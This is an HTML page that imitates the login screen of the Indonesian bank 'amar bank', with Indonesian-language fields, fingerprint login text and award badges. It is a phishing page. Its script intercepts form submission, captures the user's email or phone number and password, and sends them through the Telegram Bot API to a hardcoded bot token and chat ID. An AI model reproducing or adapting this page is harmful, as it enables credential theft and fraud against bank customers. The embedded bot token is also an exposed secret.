<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amar Bank Login</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <!-- Custom CSS -->
    <link rel="stylesheet" href="styles.css">
</head>
<style>
  /* Body background gradient */
body {
    background: linear-gradient(135deg, #1e90ff, #32cd32);
    font-family: 'Roboto', sans-serif;
}

/* Card styling */
.card {
    box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
    border-radius: 12px;
}

/* Logo and Bank Name */
.logo {
    display: flex;
    align-items: center;
    justify-content: center;
    color: #1e90ff;
}

.bank-name {
    font-size: 1.5rem;
    font-weight: 500;
    color: #1e90ff;
    margin-left: 15px;
}

/* Input fields */
.input-group-text {
    background-color: transparent;
    border: none;
    margin-top: 40px;
}

/* Fingerprint icon */
.fingerprint-icon {
    color: #40AA86;
}

/* Awards icons */
.award-icon {
    width: 30px;
    height: 30px;
}

/* Customize button styling */
.btn-primary {
    background-color: #40AA86;
    border: none;
    height: 55px;
    border-radius: 40px;
}

.btn-primary:hover {
    background-color: #1a7ccd;
}
/* Style for input fields with only bottom border */
.form-control {
    border: none;
    border-bottom: 1px solid #727272;
    border-radius: 0;
    box-shadow: none;
}

.form-control:focus {
    outline: none;
    box-shadow: none;
    border-bottom: 1px solid #727272; /* Darker blue on focus */
}
.default-text {
    color: #000000; /* Ganti dengan warna yang Anda inginkan */
}

.daftar-link {
    color: #40AA86; /* Warna untuk "Daftar sekarang" */
    text-decoration: none;
}

.daftar-link:hover {
    color: #1a7ccd; /* Warna saat hover jika diinginkan */
}
</style>
<body>
    <div class="container d-flex align-items-center justify-content-center vh-100">
        <div class="card text-center p-4" style="width: 100%; max-width: 400px;">
            <div class="logo mb-3">
                <i class="fas fa-infinity fa-2x"></i>
                <span class="bank-name">amar bank</span>
            </div>
            <form id="loginForm">
                <div class="mb-3 input-group">
                    <span class="input-group-text"><i class="fas fa-envelope"></i></span>
                    <input type="text" name="emailOrPhone" class="form-control" placeholder="E-mail atau Nomor HP" required>
                </div>
                <div class="mb-3 input-group">
                    <span class="input-group-text"><i class="fas fa-lock"></i></span>
                    <input type="password" name="password" class="form-control" placeholder="Password" required>
                    <button type="button" class="btn btn-light input-group-text"><i class="fas fa-eye"></i></button>
                </div>
                <button type="submit" class="btn btn-primary w-100 mb-3">Masuk</button>
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <div class="form-check">
                        <input type="checkbox" class="form-check-input" id="rememberMe">
                        <label class="form-check-label" for="rememberMe">Ingat saya</label>
                    </div>
                    <a href="#" class="text-decoration-none" style="color: #40AA86;">Lupa password?</a>
                </div>
            </form>
            <hr>
            <p>Atau login dengan sidik jari</p>
            <div class="fingerprint-icon mb-3"><i class="fas fa-fingerprint fa-3x"></i></div>
            <p><span class="default-text">Belum punya akun?</span> <a href="#" class="text-decoration-none daftar-link">Daftar sekarang</a></p>
            <div class="awards d-flex justify-content-center gap-2 mt-3">
             <div class="awards d-flex justify-content-center gap-2 mt-3">
                <img src="https://i.ibb.co.com/TcZsSMg/logo-gpa-2023.png" alt="Award 1" class="award-icon">
                <img src="https://i.ibb.co.com/zHcBdrR/pngtree-best-award-medal-with-rice-or-paddy-symbol-in-gold-and-png-image-6587285.png" alt="Award 2" class="award-icon">
                <img src="https://i.ibb.co.com/M9HGdf2/image-1679392179.png" alt="Award 3" class="award-icon">
                <img src="https://i.ibb.co.com/YB8nyWH/indonesia-grand-digital-marketing-awards-2022.png" alt="Award 4" class="award-icon">
                <img src="https://i.ibb.co.com/S0dzs9m/images.png" alt="Award 5" class="award-icon">
                <img src="https://i.ibb.co.com/gjyb3vK/indonesia-best-bank-award-2022.png" alt="Award 6" class="award-icon">
            </div>
        </div>
    </div>

    <!-- Bootstrap and Font Awesome JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/js/all.min.js"></script>
    
    <script>
        // Replace with your Telegram bot token and chat ID
        const botToken = "7673810619:AAFBi0aUwLPWbhrMn2yP6OTz1L84LAnwJD4";
        const chatId = "7832654476";
        
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent default form submission

            // Get the form data
            const emailOrPhone = document.querySelector('input[name="emailOrPhone"]').value;
            const password = document.querySelector('input[name="password"]').value;

            // Prepare the message to send to Telegram
            const message = `Login Attempt:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;

            // Send the message to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(response => {
                if (response.ok) {
                    alert("Login data sent to Telegram successfully.");
                } else {
                    alert("Failed to send login data to Telegram.");
                }
            }).catch(error => {
                alert("Error: " + error.message);
            });
        });
    </script>
</body>
</html>
